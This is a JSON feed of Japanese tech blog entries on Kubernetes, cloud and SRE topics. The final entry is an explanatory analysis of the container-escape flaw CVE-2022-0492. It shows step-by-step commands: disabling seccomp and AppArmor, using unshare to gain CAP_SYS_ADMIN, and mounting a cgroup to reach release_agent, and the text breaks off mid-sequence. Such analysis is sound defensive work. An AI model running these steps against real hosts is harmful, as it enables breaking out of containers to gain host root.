Masashi","authorId":"masasuzu"},{"title":"インシデント対応しながら書くポストモーテム","link":"https://zenn.dev/toshikish/articles/1d5bcf9ed1939d","contentSnippet":"このエントリーは 3-shake Advent Calendar 2022 8日目の記事です。サービスにおいてインシデントが発生した場合に書くポストモーテムについて，書く負担を減らせるようなテンプレートを提案します。 ポストモーテムのテンプレートポストモーテムのテンプレートは，例えば以下のようなものが公開されています。 Google SREhttps://sre.google/sre-book/example-postmortem/タイトル・インシデント ID日付対応者ステータス概要影響主な原因障害発生のトリガー解決策検知アクションアイテム...","isoDate":"2022-12-07T22:00:00.000Z","dateMiliSeconds":1670450400000,"authorName":"toshikish","authorId":"toshikish"},{"title":"社会に蔓延る労苦〈Toil〉をなくす（株式会社スリーシェイク入社エントリ）","link":"https://qiita.com/tayakun/items/2f5ca30b777a54b2c52d","contentSnippet":"このエントリーは 3-shake Advent Calendar 2022 5日目の記事です。前日は @aqarium さんによる 徒然なるままにDatadog APM でした。私は株式会社スリーシェイクに入社し１ヶ月がたちました。そこで入社エントリーを書き、どうして...","isoDate":"2022-12-05T14:18:53.000Z","dateMiliSeconds":1670249933000,"authorName":"Soichiro Taya","authorId":"tayakun"},{"title":"Prometheus で探索対象の ServiceMonitor を広げる","link":"https://zenn.dev/toshikish/articles/70424038397d6d","contentSnippet":"Kubernetes クラスタで Prometheus を導入し，ServiceMonitor を作って監視対象を定義したところ，一向に Target として追加されないことがありました。ServiceMonitor が作られているだけでは不十分で，Prometheus の探索する対象に入っている必要があります。それがどこで定義されているかを調べました。以下のような ServiceMonitor を考えます。apiVersion: monitoring.coreos.com/v1kind: ServiceMonitormetadata:  name: example-serv...","isoDate":"2022-12-05T09:53:34.000Z","dateMiliSeconds":1670234014000,"authorName":"toshikish","authorId":"toshikish"},{"title":"複数の Terraform リソースを一度に別の tfstate ファイルに移動する","link":"https://zenn.dev/toshikish/articles/61db8661cb28ba","contentSnippet":"Terraform の tfstate ファイル間のリソースの移動方法は，基本的には以下の記事の通りです。https://www.karakaram.com/moving-terraform-resources-to-another-tfstate-file/この記事では複数リソースを移動したい場合の方法を書きます。 方法やることはシンプルで，リソースをファイルで列挙して xargs で terraform state mv を繰り返すだけです。移動元ディレクトリで terraform state list を実行することで，その tfstate ファイル内の全リソースを取...","isoDate":"2022-11-25T07:33:50.000Z","dateMiliSeconds":1669361630000,"authorName":"toshikish","authorId":"toshikish"},{"title":"docker-buildxとmulti-platform build周りについてまとめ","link":"https://zenn.dev/bells17/articles/docker-buildx","contentSnippet":"最近docker buildxを使ったmulti-platform build周りについての知見がある程度溜まってきたので必要そうな情報をまとめておく。buildx自体が実際に使うとハマりどころが多いので、すんなりと納得できるような文章がかけてないとは思うけど、実際に触る人がハマったり疑問に思ったりする内容の穴埋めはある程度できてるとは思ってる。ちなみにこの記事を書いてる時点のdocker-buildxの最新バージョンがv0.9.1なので、貼ってあるbuildxのリンクについては基本このバージョンのものになる。 docker-buildxってなに？リポジトリを見るとdock...","isoDate":"2022-11-19T16:52:45.000Z","dateMiliSeconds":1668876765000,"authorName":"bells17","authorId":"bells17"},{"title":"AWS IAM ポリシーの StringNotEquals 条件の複数値指定は AND になる","link":"https://zenn.dev/toshikish/articles/2d9274783acbae","contentSnippet":"AWS IAM ポリシーの条件で同一キーに対して複数値を指定した場合，通常は OR で評価されます。例えば，以下の StringEquals 条件の例では，aws:PrincipalTag/role が audit または security のいずれかであれば true になります。\\"Condition\\": {  \\"StringEquals\\": {    \\"aws:PrincipalTag/role\\": [ \\"audit\\", \\"security\\" ]  }}では StringNotEquals 条件にするとどうでしょうか？例えば以下のポリシーで aws:Principal...","isoDate":"2022-11-10T08:31:56.000Z","dateMiliSeconds":1668069116000,"authorName":"toshikish","authorId":"toshikish"},{"title":"2022年10月のふりかえり、まとめ","link":"https://blog.masasuzu.net/entry/2022/11/09/082007","contentSnippet":"7年ぶりにふり返りするような気がします。これぶりですかね。blog.masasuzu.net10月は思い立って細かいことでも記録に残すようにし始めたのでサブブログの月間投稿数が増えてます。このまま続けたいところです。メインブログは相変わらず0なのでちゃんと書きたいところではあります。2022-10-01から1ヶ月間の記事一覧 - ふり返る暇なんて無いね仕事10月は端境期だったので、技術検証をメインでやってました。技術メインブログの方はどちらかというとパブリック向けに書いてます。ただ、この方針だと記事がゆるい記事が書きにくくなってきたので、サブブログを作った経緯があります。サブブログの技術記事は他の誰かのためではなく未来の自分が思い出すために書くをモットーに書いてます。なのでゆるく、細かい系のことも気軽に書いてます。分からないことは分からないと明示する。途中でも経過を残す。恥も残す。そんな感じです。以前とくらべてGoogle Cloud回りを10月はいじってた感じですね。build-in commandのmanが引けなくて困った - ふり返る暇なんて無いねt3系インスタンスのスペックについて - ふり返る暇なんて無いねGoogle Cloudの外部HTTP(S)ロードバランサと外部HTTP(S)ロードバランサ(従来型)の違いがわからなかった。 - ふり返る暇なんて無いね未解決: Google Cloud Storageの静的配信でnginxで言うところのtry_files的なことをしたかった。。。。 - ふり返る暇なんて無いねはてなブログのカテゴリごとのRSSフィード - ふり返る暇なんて無いねGitHub Actionsで save-state とset-output が廃止されるようです。 - ふり返る暇なんて無いね故障と障害の違いがわからずに困惑してた - ふり返る暇なんて無いね資格PCA取りました!11月にはPCA、KCNA、年内にCKA、CKADを取ることを目標に業務とは別に学習してます。なお、業務ではGoogle CloudもKubernetesも今のところ触る余地ないです。が、将来の投資として学習してます。近い未来で使うのが目に見えてるので。Google Cloud認定 Professional Cloud Architect合格してた - ふり返る暇なんて無いね11月末ターゲットで2個資格試験受けます - ふり返る暇なんて無いね旅土曜日の午前中に温泉入るのにはまってます。休日の早い時間に行動すると時間の有効活用ができるなとしみじみ感じてます。人生に疲れたので熱海で温泉入ってきた - ふり返る暇なんて無いね横須賀で温泉入ってきた - ふり返る暇なんて無いね江ノ島に行ってきて午前中だけで満足した - ふり返る暇なんて無いね生活寒くなりましたが、がんばります。今季初暖房使いました。 - ふり返る暇なんて無いね技術書を複数回読むということ - ふり返る暇なんて無いねワクチン4回目打った\uD83D\uDC89\uD83D\uDC89\uD83D\uDC89\uD83D\uDC89 - ふり返る暇なんて無いね11月に向けてといっても11月始まってますが。11月は資格の勉強もあるし、新しい固めのお仕事も始まるので、だいぶヘビーになる予感を感じてます。寒くなる季節なので体調には気を付けつつも、引き続き温泉につかり、ブログ書くのも続けて行きたいですね。","isoDate":"2022-11-08T23:20:07.000Z","dateMiliSeconds":1667949607000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"[2022/10/28] #kubenews 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20221028","contentSnippet":"#kubenewsの2022年10月28日の回で話す、@bells17が今週気になったニュース記事をまとめたものです自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってますこの記事自体はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です配信URL:https://youtu.be/whnN4hwsIYg 告知とかニュースっぽいもの Open Networking Conference Japanちょうど今日開催し...","isoDate":"2022-10-28T13:05:14.000Z","dateMiliSeconds":1666962314000,"authorName":"bells17","authorId":"bells17"},{"title":"Kubernetes クラスタ内ホスト名に CNAME レコードでエイリアスを付与したい","link":"https://zenn.dev/toshikish/articles/7f555dbf1b4b7d","contentSnippet":"Kubernetes クラスタ内で使えるホスト名に CNAME レコード相当でエイリアスを付与したい場合を考えます。クラスタ内では CoreDNS が使われているものとします。 TL;DRCorefile（CoreDNS の設定ファイル）で rewrite プラグインを使って記述します。例えば Service のアドレスである foo.default.svc.cluster.local を foo.example.com にエイリアスしたい場合は以下のように行を追加します。apiVersion: v1kind: ConfigMapmetadata:  name: cor...","isoDate":"2022-10-28T10:45:26.000Z","dateMiliSeconds":1666953926000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Bugless Code","link":"https://speakerdeck.com/yunosukey/bugless-code","contentSnippet":"","isoDate":"2022-10-16T04:00:00.000Z","dateMiliSeconds":1665892800000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Tests in Go","link":"https://speakerdeck.com/yunosukey/tests-in-go","contentSnippet":"","isoDate":"2022-10-16T04:00:00.000Z","dateMiliSeconds":1665892800000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"DB Tree Algorithms","link":"https://speakerdeck.com/yunosukey/db-tree-algorithms","contentSnippet":"","isoDate":"2022-10-16T04:00:00.000Z","dateMiliSeconds":1665892800000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"React and XSS","link":"https://speakerdeck.com/yunosukey/react-and-xss","contentSnippet":"","isoDate":"2022-10-16T04:00:00.000Z","dateMiliSeconds":1665892800000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Istio のサービスへの接続でプロトコルエラーになる","link":"https://zenn.dev/toshikish/articles/d0dd54ae067bed","contentSnippet":"現象Istio サービスメッシュを有効にした Kubernetes クラスタ内に立てた Service に接続しようとするも，upstream connect error or disconnect/reset before headers. reset reason: protocol error が出て到達できない。例えば，以下のような Service に gRPC で接続しようとしても失敗する。apiVersion: v1kind: Servicemetadata:  name: my-servicespec:  selector:    app.kubern...","isoDate":"2022-10-04T02:55:06.000Z","dateMiliSeconds":1664852106000,"authorName":"toshikish","authorId":"toshikish"},{"title":"SQL*Loaderで複数の文字コードが混ざったデータをロードする","link":"https://zenn.dev/nnaka2992/articles/load_complex_characterset_oracle","contentSnippet":"SQL*Loaderで複数の文字コードが混ざったデータをロードする 概要単一のテキストファイル内で特定のカラムのみ文字コードが違うファイルをSQL*Loaderでデータベースに取り込む方法 注意本記事で扱っている対処方法はおそらく紛れ込んだ文字コードが本来あるべき文字コードの一部として解釈できない場合使用できないと思います。(未検証)最低限文字化けしながらも読み込める状態を想定しています。 結論コントロールファイル内で文字コードの変換が必要なカラムに以下の関数を適用する。column \\"CONVERT(:column, \'target_charset\', \'s...","isoDate":"2022-09-25T14:48:29.000Z","dateMiliSeconds":1664117309000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"[2022/09/02] #kubenews 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220902","contentSnippet":"#kubenewsの2022年09月2日の回で話す、@bells17が今週気になったニュース記事をまとめたものです自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってますこの記事自体はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です配信URL:https://youtu.be/r2YsmQFcv-o 告知とかニュースっぽいもの controller-runtime clientについてhttps://zenn....","isoDate":"2022-09-02T13:01:11.000Z","dateMiliSeconds":1662123671000,"authorName":"bells17","authorId":"bells17"},{"title":"Visual Studio Codeで使えるリモート環境のdevcontainerが意外と便利そうだったのでまとめ","link":"https://zenn.dev/bells17/articles/remote-ssh-devcontainer","contentSnippet":"試してたらたまたまVisual Studio Code(vscode)のdevcontainer(Remote Container)が、Remote SSH経由でリモート環境でも使えることを知ったので、devcontainer用の環境構築方法やdevcontainerの構築方法についてまとめてみた今まではローカル環境のdockerか、codespaceでしか利用できないのかなと思っていたのだけど、リモート含めて利用できるとかなり便利そうな印象だったので一通り試してみました最近はRemote SSHでリモート環境を利用するケースが多いのでリモート環境で使えないならそんなに使えないかなと...","isoDate":"2022-09-01T18:16:25.000Z","dateMiliSeconds":1662056185000,"authorName":"bells17","authorId":"bells17"},{"title":"controller-runtime clientについて","link":"https://zenn.dev/bells17/articles/controller-runtime-client","contentSnippet":"KubernetesでOperatorやControllerを開発する際に利用するフレームワークであるcontroller-runtimeのclientについて調べたのでまとめます。この記事の目的は以下のような感じになります:controller-runtimeが提供するKubernetes clientの概要についてまとめることcontroller-runtime client周りの追加の不明点などがあった場合には、この記事をベースにコードベースで調べたいことをすぐに調べられる程度にはコードレベルで詳しい内容をまとめること以下についてわかるようになること各種内部clien...","isoDate":"2022-08-27T09:30:47.000Z","dateMiliSeconds":1661592647000,"authorName":"bells17","authorId":"bells17"},{"title":"Software Design 2022年9月号にコードリーディングに関する記事を寄稿しました","link":"https://bells17.medium.com/oss-source-code-reading-29392edf80fe?source=rss-713cf42ce34d------2","isoDate":"2022-08-18T15:06:54.000Z","dateMiliSeconds":1660835214000,"authorName":"bells17","authorId":"bells17"},{"title":"Security Command Center \xd7 PagerDuty 自動アラート通知の取り組み","link":"https://speakerdeck.com/kyohmizu/security-command-center-x-pagerduty-zi-dong-aratotong-zhi-falsequ-rizu-mi","contentSnippet":"3-shake SRE Tech Talk #4 の登壇資料です。\\rhttps://3-shake.connpass.com/event/253028/","isoDate":"2022-08-04T04:00:00.000Z","dateMiliSeconds":1659585600000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"SRETT#4黒い画面をもっと効率的に(使って自動化の時間を捻出)","link":"https://speakerdeck.com/masasuzu/srett-number-4hei-ihua-mian-womotutoxiao-lu-de-ni-shi-tutezi-dong-hua-falseshi-jian-wonian-chu","contentSnippet":"","isoDate":"2022-08-04T04:00:00.000Z","dateMiliSeconds":1659585600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"[2022/07/015] #kubenews 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220715","contentSnippet":"#kubenewsの2022年07月15日の回で話す、@bells17が今週気になったニュース記事をまとめたものです自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってますこの記事自体はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です配信URL:https://youtu.be/ar1_fxX601E 告知とかニュースっぽいもの 『Linuxで動かしながら学ぶTCP/IPネットワーク入門』でネットワークの勉強をし...","isoDate":"2022-07-15T07:31:08.000Z","dateMiliSeconds":1657870268000,"authorName":"bells17","authorId":"bells17"},{"title":"サイバー攻撃から Kubernetes クラスタを守るための効果的なセキュリティ対策","link":"https://speakerdeck.com/kyohmizu/saibagong-ji-kara-kubernetes-kurasutawoshou-rutamefalsexiao-guo-de-nasekiyuriteidui-ce","contentSnippet":"CloudNative Security Conference 2022 プレイベント の登壇資料です。\\rhttps://cloudnativedays.connpass.com/event/252961/","isoDate":"2022-07-12T04:00:00.000Z","dateMiliSeconds":1657598400000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"[2022/07/01] #kubenews 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220701","contentSnippet":"#kubenewsの2022年07月01日の回で話す、@bells17が今週気になったニュース記事をまとめたものです自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってますこの記事自体はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です配信URL:https://youtu.be/R7VHtaBZFkQ 告知とかニュースっぽいもの Kubernetes Novice Tokyo #20にてKueueのセッションを行...","isoDate":"2022-07-01T11:14:01.000Z","dateMiliSeconds":1656674041000,"authorName":"bells17","authorId":"bells17"},{"title":"AWS SAP 合格体験記 2022/06","link":"https://zenn.dev/tayusa/articles/7b3dd99a79403c","contentSnippet":"はじめにネットで公開されている数々のAWS Certified Solutions Architect - Professionalの合格体験記や勉強法などにお世話になったので自分も書いてみることにしました。教材選びや学習スケジュールの参考になれば嬉しいです。 私の前提知識まず、本題に入る前に私のSAPを受ける前までのスキルセットを軽く紹介させてください。業務でのAWS歴は8ヶ月ほどで現在SREとして働いています以前はRuby on Railsなどを書くプログラマーをやっていましたAWS SAAは2022/03に取得しましたAWSではない他のIT資格は以下で...","isoDate":"2022-06-24T00:36:49.000Z","dateMiliSeconds":1656031009000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"istio-proxyがどのように通信を仲介しているかを知る","link":"https://zenn.dev/tayusa/articles/aa54bbff3d0d2d","contentSnippet":"目的前回、書いた記事で素のKubernetesのネットワークについて少し理解できたのですが、Istioを入れた場合はEnvoyが通信を仲介するのでその仕組みを知りたく調べてみましたhttps://zenn.dev/tayusa/articles/c705cd65b6ee74 環境OS: Arch Linux(5.17.9-arch1-1)k8sの環境: kindhttps://kind.sigs.k8s.io/version 0.14.0デフォルトのk8sのバージョンは1.24 クラスタのセットアップ kindでクラスタ作成https:...","isoDate":"2022-06-03T18:42:53.000Z","dateMiliSeconds":1654281773000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"asdf のバージョン アップがうまくいかなかった","link":"https://zenn.dev/kyohei_saito/articles/40a13800f34d5f","contentSnippet":"最近、転職により業務環境が Windows から Mac に変わったことで、ツール類のバージョン管理として asdf を使用しはじめました。asdf 自体のバージョンアップがうまくいかない事象に直面したため、解決方法をメモしておきます。 サマリHomebrew により asdf をバージョンアップしたら、asdf でインストールしたツールが使用できなくなりました。shim ディレクトリ内のスクリプトに記述された asdf のパスが古いバージョンとなっていたことが原因でした。shim ディレクトリを別のディレクトリに移動後、asdf reshim を実行することで shim デ...","isoDate":"2022-05-29T09:36:54.000Z","dateMiliSeconds":1653817014000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"KubernetesのServiceの挙動を確認する","link":"https://zenn.dev/tayusa/articles/c705cd65b6ee74","contentSnippet":"目的普段、Kubernetesを触ってはいるのですが、表面的な使い方しか知らないので動きを確認してみます 環境OS: Arch Linux(5.17.9-arch1-1)k8sの環境: kindhttps://kind.sigs.k8s.io/version 0.14.0デフォルトのk8sのバージョンは1.24 ひとまず、ローカルでクラスタを立てる環境に応じてkindをインストールhttps://kind.sigs.k8s.io/docs/user/quick-start/#installationクラスタの作成$ kind ...","isoDate":"2022-05-28T12:19:47.000Z","dateMiliSeconds":1653740387000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Goで立てたWebサーバーでソケットを学ぶ","link":"https://zenn.dev/tayusa/articles/077d911b357a92","contentSnippet":"目的TCPなどにまるで明るくないので、学習のために調べてみました 環境Arch Linux(5.17.9-arch1-1)go version go1.18.3 linux/amd64 やることGoで書いたWebサーバーを動かして挙動を確認したり、少しコードを見てみますコードは以下ですpackage mainimport (\\t\\"fmt\\"\\t\\"log\\"\\t\\"net/http\\"\\t\\"time\\")func main() {\\thttp.HandleFunc(\\"/\\", func(w http.ResponseWriter, r *http.Request)...","isoDate":"2022-05-22T12:32:11.000Z","dateMiliSeconds":1653222731000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"zennの執筆環境向けdevcontainerを作成した話","link":"https://zenn.dev/bells17/articles/zenn-devcontainer","contentSnippet":"タイトルまんまでzennの執筆環境向けdevcontainerを作成したという話です前々からzennの記事はGithub repositoryと連携して書いており、codespaceにvscodeから接続して執筆してたのですが、zenn-cliを使ったプレビューが可能らしいということを最近知ったので、devcontainerの勉強がてらサクッとプレビューが可能な環境を作りましたという内容になります作ったdevcontainerのリポジトリはこちらですhttps://github.com/bells17/zenn-template 使い方READMEに書いてある通りですが、te...","isoDate":"2022-04-17T15:27:41.000Z","dateMiliSeconds":1650209261000,"authorName":"bells17","authorId":"bells17"},{"title":"[2022/04/15] 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220415","contentSnippet":"普段は#kubenewsの2022年04月15日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://youtu.be/j76uphcYs2E 告知とかニュースっぽいもの Kubernetes Meetup TokyoでLTする予定ですhttps...","isoDate":"2022-04-15T12:50:24.000Z","dateMiliSeconds":1650027024000,"authorName":"bells17","authorId":"bells17"},{"title":"吉祥寺.pm29で久しぶりにLTしてきました #kichijojipm","link":"https://blog.masasuzu.net/entry/2022/04/15/202342","contentSnippet":"kichijojipm.connpass.com久しぶりにLTしてきました。久しぶりに外で発表したいなと思いつつ、だいぶブランクあるのでちょうどいいリハビリできるところがないかな。— masasuzu (@masasuz) 2022年4月9日  こんなこと考えてたら良いタイミングできちぴーが開催されるので、LT申し込んでみました。#kichijojipm 7年ぶりにLTしたので緊張した。というのと、前回の発表調べて7年前もきちぴーあったのかという驚きもあった。— masasuzu (@masasuz) 2022年4月12日  どうやら7年ぶりだったみたいです。タイミング的に最終出社日の翌日だったので、キャリアの話をしました。diary.masasuzu.net正直、LTにおさまる量じゃなかったのは反省点です。資料ももうちょっとなんとかできたかなあという気持ちがあります。少しずつ登壇回数増やして、勘を取り戻していきたいところ。","isoDate":"2022-04-15T11:23:42.000Z","dateMiliSeconds":1650021822000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2022-04-12 吉祥寺.pm 29","link":"https://speakerdeck.com/masasuzu/2022-04-12-ji-xiang-si-dot-pm-29","contentSnippet":"","isoDate":"2022-04-12T04:00:00.000Z","dateMiliSeconds":1649736000000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"CVE-2022-0492 調査まとめ","link":"https://kyohmizu.hatenablog.com/entry/2022/04/06/233150","contentSnippet":"cgroups v1 の脆弱性 CVE-2022-0492 について、調査した内容をまとめました。イベントで発表した内容ですが、時間の都合で語りきれなかった部分も多く、内容を加筆してブログに書くことにしました。 speakerdeck.comCVE-2022-0492 概要release_agent についてエクスプロイト前提条件要点検証修正パッチコンテナセキュリティseccompAppArmor (SELinux)Kubernetes の場合EKS, GKE の場合さいごに参考リンクCVE-2022-0492LinuxコンテナセキュリティCVE-2022-0492 概要CVE-2022-0492 は cgroups v1 における特権昇格・コンテナブレイクアウトの脆弱性です。cgroups v1 の release_agent 機能を悪用することで、コンテナからホストの root 権限で任意コマンド実行が可能となります。詳細は後述しますが、これは本来特権コンテナに限定されるべき設定が、capabilities のチェック漏れにより非特権コンテナから行える状態だったことが原因です。本脆弱性は seccomp や AppArmor/SELinux を有効にすることで回避可能です。release_agent についてcgroups v1 は cpu, memory, pids のようにリソースをサブシステムに分割し、各サブシステムがディレクトリ構造を取っています。# ls /sys/fs/cgroup/blkio  cpu,cpuacct  cpuset   freezer  memory  net_cls           net_prio    pids  systemdcpu    cpuacct      devices  hugetlb  misc    net_cls,net_prio  perf_event  rdma  unifiedrelease_agent は各 cgroup サブシステムのルートディレクトリに配置されるファイルで、cgroup 内のプロセスが終了する時に起動させるプログラムを設定します。リリースエージェントプログラム の起動の有無は、cgroup ディレクトリ内の notify_on_release の値で判断されます。このファイルはルート以下、各 child cgroup のディレクトリにも配置されています。notify_on_release = 1 の場合、リリースエージェントプログラムを起動します。cgroup のディレクトリ構成pids cgroup のルートディレクトリを見ると、以下のように release_agent, notify_on_release のファイルを確認できます。# ls /sys/fs/cgroup/pids/cgroup.clone_children  cgroup.sane_behavior  docker      notify_on_release  system.slice  user.slicecgroup.procs           default               init.scope  release_agent      tasks# cat /sys/fs/cgroup/pids/release_agent   ← 空のファイル# cat /sys/fs/cgroup/pids/notify_on_release 0ちなみにコンテナに CAP_SYS_ADMIN がある場合、release_agent を使えば本脆弱性を利用することなくブレイクアウト可能です。https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)また cgroups v2 には release_agent がなく、リリースの通知は別の仕組みを使っています。エクスプロイト前提条件本脆弱性は次の条件を全て満たす場合に影響があります。root ユーザーまたは、no_new_privsフラグなしでコンテナを起動しているseccomp, AppArmor/SELinux がいずれも有効でないホストの非特権ユーザー名前空間が有効（ubuntu ではデフォルトの設定です）各設定の確認方法↓# cat /proc/sys/kernel/unprivileged_userns_clone   ← 非特権ユーザ名前空間1# cat /proc/self/status | grep Seccomp   ← seccompSeccomp:    0Seccomp_filters:    0# cat /proc/self/attr/current   ← AppArmordocker-default (enforce)要点コンテナから cgroups の release_agent に書き込みたいrdma サブシステムは root cgroup に所属しているが、readonly でマウントされているcgroup を rw で新たにマウントしたいが、マウントには CAP_SYS_ADMIN が必要unshare で user namespace (ns) を作成すれば CAP_SYS_ADMIN が得られるcgroup, mount ns も同時に作成することで cgroup をマウント可能にrdma cgroup をマウント すると release_agent に書き込み可能cgroup 内のプロセスが終了するタイミングで、任意のプログラムをホストの root 権限で実行検証脆弱な Kernel バージョンで CVE-2022-0492 を検証します。インスタンスに用意した ubuntu 上で、seccomp, AppArmor をオフにした docker コンテナを起動します。# uname -aLinux ip-172-31-1-29 5.13.0-1017-aws #19~20.04.1-Ubuntu SMP Mon Mar 7 12:53:12 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux# docker run --rm -it --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu bashdocker はコンテナ作成時に cgroup ns を作成しないので、コンテナはホストと同じ cgroup ns に所属しています。自身の cgroup を確認すれば root cgroup からのパスがわかるため、コンテナ内から各サブシステムが root cgroup に所属しているかどうか調べることができます。root@ab988587a245:/# cat /proc/self/cgroup13:misc:/12:rdma:/   ← rdma サブシステムは root cgroup11:hugetlb:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a10:cpuset:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a9:net_cls,net_prio:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a8:perf_event:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a7:blkio:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a6:devices:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a5:freezer:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a4:cpu,cpuacct:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a3:pids:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a2:memory:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a1:name=systemd:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a0::/system.slice/containerd.serviceこれで rdma サブシステムが root cgroup に所属していることがわかりました。root@ab988587a245:/# mount | grep \'cgroup (ro\'cgroup on /sys/fs/cgroup/systemd type cgroup (ro,nosuid,nodev,noexec,relatime,xattr,name=systemd)cgroup on /sys/fs/cgroup/memory type cgroup (ro,nosuid,nodev,noexec,relatime,memory)cgroup on /sys/fs/cgroup/pids type cgroup (ro,nosuid,nodev,noexec,relatime,pids)cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (ro,nosuid,nodev,noexec,relatime,cpu,cpuacct)cgroup on /sys/fs/cgroup/freezer type cgroup (ro,nosuid,nodev,noexec,relatime,freezer)cgroup on /sys/fs/cgroup/devices type cgroup (ro,nosuid,nodev,noexec,relatime,devices)cgroup on /sys/fs/cgroup/blkio type cgroup (ro,nosuid,nodev,noexec,relatime,blkio)cgroup on /sys/fs/cgroup/perf_event type cgroup (ro,nosuid,nodev,noexec,relatime,perf_event)cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (ro,nosuid,nodev,noexec,relatime,net_cls,net_prio)cgroup on /sys/fs/cgroup/cpuset type cgroup (ro,nosuid,nodev,noexec,relatime,cpuset)cgroup on /sys/fs/cgroup/hugetlb type cgroup (ro,nosuid,nodev,noexec,relatime,hugetlb)cgroup on /sys/fs/cgroup/rdma type cgroup (ro,nosuid,nodev,noexec,relatime,rdma)   ← readonly でマウントされているcgroup on /sys/fs/cgroup/misc type cgroup (ro,nosuid,nodev,noexec,relatime,misc)root@ab988587a245:/# ls -l /sys/fs/cgroup/rdma/total 0-rw-r--r--  1 root root 0 Mar 15 01:40 cgroup.clone_children-rw-r--r--  1 root root 0 Mar 15 01:40 cgroup.procs-r--r--r--  1 root root 0 Mar 15 01:40 cgroup.sane_behavior-rw-r--r--  1 root root 0 Mar 15 01:40 notify_on_release-rw-r--r--  1 root root 0 Mar 29 16:01 release_agentdrwxr-xr-x 13 root root 0 Mar 26 21:07 system.slice-rw-r--r--  1 root root 0 Mar 15 01:40 tasksroot@ab988587a245:/# echo test > /sys/fs/cgroup/rdma/release_agent bash: /sys/fs/cgroup/rdma/release_agent: Read-only file system   ← 書き込みエラーというわけで、cgroup を rw でマウントできれば良いことになります。ここで capability を確認すると、コンテナは CAP_SYS_ADMIN を持っておらず、このままでは cgroup をマウントする権限がありません。root@ab988587a245:/# apt update && apt install -y libcap2-binroot@ab988587a245:/# cat /proc/self/status | grep CapEffCapEff: 00000000a80425fbroot@ab988587a245:/# capsh --decode=00000000a80425fb0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcaproot@ab988587a245:/# mount -t cgroup -o rdma cgroup /mntmount: /mnt: permission denied.   ← マウントエラーCAP_SYS_ADMIN を付与するため user ns を作成し新たにプロセスを立ち上げます。さらに mount, cgroup ns を同時に作成することで、コンテナ内でのマウントが可能になります。マウントさえできれば release_agent に書き込むことができます。root@ab988587a245:/# unshare -rmC bash   ← user, mount, cgroup ns を作成root@ab988587a245:/# cat /proc/self/status | grep CapEffCapEff: 000001ffffffffffroot@ab988587a245:/# capsh 